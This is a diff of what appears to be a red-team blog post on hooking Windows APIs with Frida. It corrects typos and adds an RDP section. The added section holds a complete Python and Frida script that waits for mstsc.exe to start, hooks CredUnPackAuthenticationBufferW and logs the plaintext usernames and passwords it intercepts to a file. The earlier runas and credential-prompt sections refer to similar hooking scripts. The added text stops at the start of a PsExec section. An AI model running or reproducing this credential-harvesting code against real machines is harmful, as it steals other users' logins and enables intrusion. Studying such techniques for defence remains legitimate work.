@@ -9,19 +9,19 @@ tags: [persistence, av evasion]
 
 ## Introduction
 
-Hooking is not a new concept as we know by now, many AV/EDR vendors use this technique to monitor suspicious API calls. In this blog post we'll explore API hooking but in the offensive point of view. We'll use API Monitor to investigate which API calls used by each program then, using Frida and python to build our final hooking script. This post is inspired by the Red Teaming Experiments [blog post.](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/instrumenting-windows-apis-with-frida )
+Hooking is not a new concept as we know by now, many AV/EDR vendors use this technique to monitor suspicious API calls. In this blog post, we'll explore API hooking but from the offensive point of view. We'll use API Monitor to investigate which API calls used by each program then, using Frida and python to build our final hooking script. This post is inspired by the Red Teaming Experiments [blog post.](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/instrumenting-windows-apis-with-frida )
 
 
 
 ## API Monitor
 
-Api Monitor is a great tool for... you guest it, monitoring api calls. You can find it [here](http://www.rohitab.com/downloads).
+Api Monitor is a great tool for... you guessed it, monitoring api calls. You can find it [here](http://www.rohitab.com/downloads).
 
 Firing up Api Monitor this will be the main screen:
 
 ![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/ApiMonitorHomeScreen.png)
 
-As you can see I've chosen all libraries options therefore, I would able to catch most of the API possibilities. Let's start by monitoring a new process, I'll choose `runas.exe` first.
+As you can see I've chosen all library options therefore, I would able to catch most of the API possibilities. Let's start by monitoring a new process, I'll choose `runas.exe` first.
 
 According to Microsoft docs:
 
@@ -33,7 +33,7 @@ Opening runas and trying to login as a different user gives us the above API cal
 
 ![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/RunasAPICall.png)
 
-Great so we know that `CreateProcessWithLogonW` api call contains our secret password. Looking at the [microsoft docs ](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) we could see that the first and third arguments will store the username and password. Now that we have that information lets build our script!.
+Great so we know that the `CreateProcessWithLogonW` api call contains our secret password. Looking at the [microsoft docs ](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) we could see that the first and third arguments will store the username and password. Now that we have that information let's build our script!.
 
 
 
@@ -62,7 +62,7 @@ Interceptor.attach(CreateProcessWithLogonW, { // getting our juice arguments (ac
 });
 ```
 
-Now, all left to do is to insert the JavaScript snippet to a python script, The final python script should look like this:
+Now, all left to do is to insert the JavaScript snippet into a python script, The final python script should look like this:
 
 ```python
 # Wrriten by Ilan Kalendarov
@@ -158,7 +158,7 @@ Great! lets try to run the script:
 
    
 
-At this point its pretty easy, Implementing the steps like we did with the CLI version of runas. Lets fire up API Monitor. Using the process locator option in API Monitor we could see that the process is actually `explorer.exe`:
+At this point, it's pretty easy, Implementing the steps as we did with the CLI version of runas. Let's fire up API Monitor. Using the process locator option in API Monitor we could see that the process is `explorer.exe`:
 
  ![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/processLocator.png)
 
@@ -233,3 +233,122 @@ if __name__ == "__main__":
 	CredUI()
 ```
 
+
+
+## RDP 
+
+Reading the MDSec [blog post](https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/) and Red Teaming Experiments [blog](https://www.ired.team/offensive-security/code-injection-process-injection/api-monitoring-and-hooking-for-offensive-tooling) I thought to myself, there's must be a simple way to hook RDP credentials.
+
+Looking at the Graphical Runas prompt and the RDP login prompt they look alike:
+
+![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/rdpvsRunas.png)
+
+What if they use the same API call? Let's try:
+
+Using the same script from the Credentials Prompt we were able to get the RDP credentials !!
+
+![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/FridaRdpTest.png)
+
+All left to do is to write the final python script, It should look like that:
+
+```python
+# Wrriten by Ilan Kalendarov
+
+from __future__ import print_function
+import frida
+from time import sleep
+import psutil
+from threading import Lock, Thread
+import sys
+
+# Locking the mstsc thread to prevent other threads
+#interfering with our current session
+lockRDP= Lock()  
+
+def on_message_rdp(message, data):
+	# Executes when the user enters the password.
+	# Then, open the txt file and append the data.
+	print(message)
+	if message['type'] == "send":
+		with open("Creds.txt", "a") as f:
+			f.write(message["payload"] + '\n')
+		try:
+			lockRDP.release()
+			print("[+] released")
+		except Exception:
+			pass
+
+
+def WaitForRDP():
+	while True:
+		# Trying to find if mstsc is running if so, execute the "RunAs" function.
+		if ("mstsc.exe" in (p.name() for p in psutil.process_iter())) and not lockRDP.locked():
+			lockRDP.acquire() # Locking the mstsc thread
+			print("[+] Found RunAs")
+			RunAs()
+			sleep(0.5)
+
+		# If the user regret and they "ctrl+c" from mstsc then release the thread lock and start over.
+		elif (not "mstsc.exe" in (p.name() for p in psutil.process_iter())) and lockRDP.locked():
+			lockRDP.release()
+			print("[+] RDP is dead releasing lock")
+		else:
+			pass
+		sleep(0.5)
+
+def RunAs():
+	try:
+		# Attaching to the mstsc process
+		print("[+] Trying To Attach To RDP")
+		session = frida.attach("mstsc.exe")
+		print("[+] Attached to mstsc!")
+
+		# Executing the following javascript
+		# We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the username,password,domain and the executing 		program in plain text.
+		script = session.create_script("""
+
+		var username;
+		var password;
+		var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")
+
+		Interceptor.attach(CredUnPackAuthenticationBufferW, {
+			onEnter: function (args) 
+			{
+
+				username = args[3];
+				password = args[7];
+			},
+			onLeave: function (result)
+			{
+			   
+				var user = username.readUtf16String()
+				var pass = password.readUtf16String()
+
+				if (user && pass)
+				{
+					send("\\n+ Intercepted RDP Credentials\\n" + user + ":" + pass)
+				}
+			}
+		});
+
+		""")
+		# If we got a hit then execute the "on_message_rdp" function
+		script.on('message', on_message_rdp)
+		script.load()
+	except Exception as e:
+		print(str(e))
+
+if __name__ == "__main__":
+	thread = Thread(target=WaitForRDP)
+	thread.start()
+```
+
+Executing the script will get us the creds:
+
+![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/RdpCreds.png)
+
+
+
+## PsExec
+
+Last but not least, PsExec - the great remoting tool from the sysinternals suite, This was really interesting to research 
